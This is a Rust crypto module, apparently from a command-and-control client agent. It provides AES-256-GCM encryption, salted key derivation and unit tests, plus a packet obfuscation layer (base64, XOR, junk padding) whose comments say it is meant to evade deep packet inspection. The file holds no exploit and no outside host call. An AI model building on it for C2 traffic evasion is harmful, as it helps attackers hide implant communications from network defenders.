use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};
use log::{debug, error};
use rand::RngCore;
use sha2::{Sha256, Digest};
use crate::config;

/// Nonce 长度（12 字节，AES-GCM 标准）
const NONCE_LENGTH: usize = 12;

/// 使用 Salt 和 Vkey 派生实际的 AES 密钥
/// Key = SHA256(Vkey + Salt)
pub fn derive_key(base_key: &[u8], salt: &[u8]) -> Vec<u8> {
    if salt.is_empty() {
        return base_key.to_vec();
    }
    
    let mut hasher = Sha256::new();
    hasher.update(base_key);
    hasher.update(salt);
    hasher.finalize().to_vec()
}

/// 报文混淆：对加密后的报文进行二次混淆 (防止 DPI 特征识别)
pub fn obfuscate_packet(mut data: Vec<u8>) -> Vec<u8> {
    let mode = config::get_packet_obfuscation_mode();
    if mode == "none" || mode.is_empty() {
        return data;
    }

    match mode.as_str() {
        "base64" => {
            // Base64 编码：将加密数据转为文本格式，模拟普通 HTTP/Text 流量
            use base64::engine::general_purpose::STANDARD;
            use base64::Engine;
            let b64_str = STANDARD.encode(&data);
            b64_str.into_bytes()
        }
        "xor" => {
            // XOR 流提取模式：使用 AES Key 的首字节序列进行流异或
            let key = config::get_aes_key();
            if !key.is_empty() {
                for i in 0..data.len() {
                    data[i] ^= key[i % key.len()];
                }
            }
            data
        }
        "junk" => {
            // Junk Data Padding 模式：填充随机长度的垃圾数据
            // 格式: [Encrypted Data] + [Junk Bytes] + [Original Len (4 bytes)]
            let original_len = data.len() as u32;
            let mut junk_len = (rand::random::<u8>() % 64) as usize; 
            if junk_len == 0 { junk_len = 8; }
            
            let mut junk = vec![0u8; junk_len];
            rand::thread_rng().fill_bytes(&mut junk);
            
            data.extend_from_slice(&junk);
            data.extend_from_slice(&original_len.to_be_bytes());
            data
        }
        _ => data
    }
}

/// 报文解混淆
pub fn deobfuscate_packet(mut data: Vec<u8>) -> Vec<u8> {
    let mode = config::get_packet_obfuscation_mode();
    if mode == "none" || mode.is_empty() {
        return data;
    }

    match mode.as_str() {
        "base64" => {
            use base64::engine::general_purpose::STANDARD;
            use base64::Engine;
            if let Ok(decoded) = STANDARD.decode(&data) {
                return decoded;
            }
            data
        }
        "xor" => {
            let key = config::get_aes_key();
            if !key.is_empty() {
                for i in 0..data.len() {
                    data[i] ^= key[i % key.len()];
                }
            }
            data
        }
        "junk" => {
            // 识别并移除 Junk Padding (最后 4 字节固定是原始长度)
            if data.len() < 4 { return data; }
            
            let mut len_bytes = [0u8; 4];
            len_bytes.copy_from_slice(&data[data.len()-4..]);
            let original_len = u32::from_be_bytes(len_bytes) as usize;
            
            if original_len <= data.len() - 4 {
                data.truncate(original_len);
            }
            data
        }
        _ => data
    }
}

/// 加密数据
/// 
/// 使用 AES-256-GCM 加密数据。每次加密都会生成一个新的随机 Nonce。
/// 
/// # 参数
/// 
/// * `data` - 要加密的明文数据
/// * `key` - 32 字节的 AES-256 密钥
/// 
/// # 返回值
/// 
/// 返回加密后的数据，格式为：[Nonce (12 bytes) + Ciphertext]
/// 
/// # Panics
/// 
/// 如果密钥长度不是 32 字节，会 panic。
/// 
/// # 示例
/// 
/// ```no_run
/// use c2_client_agent::crypto::encrypt;
/// use c2_client_agent::config::get_aes_key;
/// 
/// let key = get_aes_key();
/// let plaintext = b"Hello, World!";
/// let encrypted = encrypt(plaintext, &key);
/// ```
pub fn encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    debug!("Encrypting {} bytes of data", data.len());
    
    // 验证密钥长度
    assert_eq!(key.len(), 32, "AES-256 requires a 32-byte key");
    
    // 创建 AES-256-GCM 密码器
    let cipher = Aes256Gcm::new_from_slice(key)
        .expect("Invalid key length");
    
    // 生成随机 Nonce（12 字节）
    let mut nonce_bytes = [0u8; NONCE_LENGTH];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    
    debug!("Generated nonce: {} bytes", nonce_bytes.len());
    
    // 加密数据
    let ciphertext = cipher
        .encrypt(nonce, data)
        .expect("Encryption failed");
    
    debug!(
        "Encryption successful: {} bytes plaintext -> {} bytes ciphertext",
        data.len(),
        ciphertext.len()
    );
    
    // 组合 Nonce 和 Ciphertext：[Nonce (12 bytes) + Ciphertext]
    let mut result = Vec::with_capacity(NONCE_LENGTH + ciphertext.len());
    result.extend_from_slice(&nonce_bytes);
    result.extend_from_slice(&ciphertext);
    
    debug!("Final encrypted data: {} bytes (nonce + ciphertext)", result.len());
    
    result
}

/// 解密数据
/// 
/// 使用 AES-256-GCM 解密数据。从加密数据中提取 Nonce，然后解密。
/// 
/// # 参数
/// 
/// * `data` - 加密的数据，格式为：[Nonce (12 bytes) + Ciphertext]
/// * `key` - 32 字节的 AES-256 密钥
/// 
/// # 返回值
/// 
/// 成功返回解密后的明文数据，失败返回错误信息。
/// 
/// # 错误
/// 
/// - 如果数据长度小于 12 字节（无法提取 Nonce），返回错误
/// - 如果解密失败（密钥错误或数据损坏），返回错误
/// 
/// # 示例
/// 
/// ```no_run
/// use c2_client_agent::crypto::{encrypt, decrypt};
/// use c2_client_agent::config::get_aes_key;
/// 
/// let key = get_aes_key();
/// let plaintext = b"Hello, World!";
/// let encrypted = encrypt(plaintext, &key);
/// let decrypted = decrypt(&encrypted, &key).unwrap();
/// assert_eq!(plaintext, &decrypted[..]);
/// ```
pub fn decrypt(data: &[u8], key: &[u8]) -> Result<Vec<u8>, String> {
    debug!("Decrypting {} bytes of data", data.len());
    
    // 验证密钥长度
    if key.len() != 32 {
        let err = format!("AES-256 requires a 32-byte key, got {} bytes", key.len());
        error!("{}", err);
        return Err(err);
    }
    
    // 检查数据长度（至少需要 Nonce）
    if data.len() < NONCE_LENGTH {
        let err = format!(
            "Encrypted data too short: {} bytes (minimum {} bytes for nonce)",
            data.len(),
            NONCE_LENGTH
        );
        error!("{}", err);
        return Err(err);
    }
    
    // 提取 Nonce（前 12 字节）
    let nonce_bytes = &data[..NONCE_LENGTH];
    let nonce = Nonce::from_slice(nonce_bytes);
    
    debug!("Extracted nonce: {} bytes", nonce_bytes.len());
    
    // 提取 Ciphertext（剩余字节）
    let ciphertext = &data[NONCE_LENGTH..];
    
    debug!("Extracted ciphertext: {} bytes", ciphertext.len());
    
    // 创建 AES-256-GCM 密码器
    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|e| format!("Invalid key: {}", e))?;
    
    // 解密数据
    let plaintext = cipher
        .decrypt(nonce, ciphertext)
        .map_err(|e| {
            let err = format!("Decryption failed: {}", e);
            error!("{}", err);
            err
        })?;
    
    debug!(
        "Decryption successful: {} bytes ciphertext -> {} bytes plaintext",
        ciphertext.len(),
        plaintext.len()
    );
    
    Ok(plaintext)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"Hello, World! This is a test message.";
        
        // 加密
        let encrypted = encrypt(plaintext, key);
        
        // 验证加密后的数据长度
        assert!(encrypted.len() > plaintext.len());
        assert!(encrypted.len() >= NONCE_LENGTH);
        
        // 解密
        let decrypted = decrypt(&encrypted, key).unwrap();
        
        // 验证 round-trip
        assert_eq!(plaintext, &decrypted[..]);
    }

    #[test]
    fn test_encrypt_produces_different_ciphertext() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"Same message";
        
        // 加密两次
        let encrypted1 = encrypt(plaintext, key);
        let encrypted2 = encrypt(plaintext, key);
        
        // 由于 Nonce 是随机的，两次加密结果应该不同
        assert_ne!(encrypted1, encrypted2);
        
        // 但解密后应该相同
        let decrypted1 = decrypt(&encrypted1, key).unwrap();
        let decrypted2 = decrypt(&encrypted2, key).unwrap();
        assert_eq!(decrypted1, decrypted2);
        assert_eq!(plaintext, &decrypted1[..]);
    }

    #[test]
    fn test_decrypt_with_wrong_key() {
        let key1 = b"01234567890123456789012345678901"; // 32 bytes
        let key2 = b"10987654321098765432109876543210"; // 32 bytes (different)
        let plaintext = b"Secret message";
        
        // 使用 key1 加密
        let encrypted = encrypt(plaintext, key1);
        
        // 使用 key2 解密应该失败
        let result = decrypt(&encrypted, key2);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_with_corrupted_data() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"Test message";
        
        // 加密
        let mut encrypted = encrypt(plaintext, key);
        
        // 损坏数据（修改最后一个字节）
        if let Some(last) = encrypted.last_mut() {
            *last = last.wrapping_add(1);
        }
        
        // 解密应该失败
        let result = decrypt(&encrypted, key);
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_with_short_data() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let short_data = b"short"; // 少于 12 字节
        
        // 解密应该失败
        let result = decrypt(short_data, key);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("too short"));
    }

    #[test]
    fn test_decrypt_with_invalid_key_length() {
        let short_key = b"short_key"; // 少于 32 字节
        let data = vec![0u8; 20]; // 足够长的数据
        
        // 解密应该失败
        let result = decrypt(&data, short_key);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("32-byte key"));
    }

    #[test]
    fn test_encrypt_empty_data() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"";
        
        // 加密空数据
        let encrypted = encrypt(plaintext, key);
        
        // 应该至少包含 Nonce
        assert!(encrypted.len() >= NONCE_LENGTH);
        
        // 解密
        let decrypted = decrypt(&encrypted, key).unwrap();
        assert_eq!(plaintext, &decrypted[..]);
    }

    #[test]
    fn test_encrypt_large_data() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = vec![0x42u8; 10000]; // 10KB 数据
        
        // 加密
        let encrypted = encrypt(&plaintext, key);
        
        // 解密
        let decrypted = decrypt(&encrypted, key).unwrap();
        
        // 验证
        assert_eq!(plaintext, decrypted);
    }

    #[test]
    fn test_nonce_is_prepended() {
        let key = b"01234567890123456789012345678901"; // 32 bytes
        let plaintext = b"Test";
        
        // 加密
        let encrypted = encrypt(plaintext, key);
        
        // 前 12 字节应该是 Nonce
        assert!(encrypted.len() >= NONCE_LENGTH);
        
        // 提取 Nonce 并验证可以解密
        let result = decrypt(&encrypted, key);
        assert!(result.is_ok());
    }
}
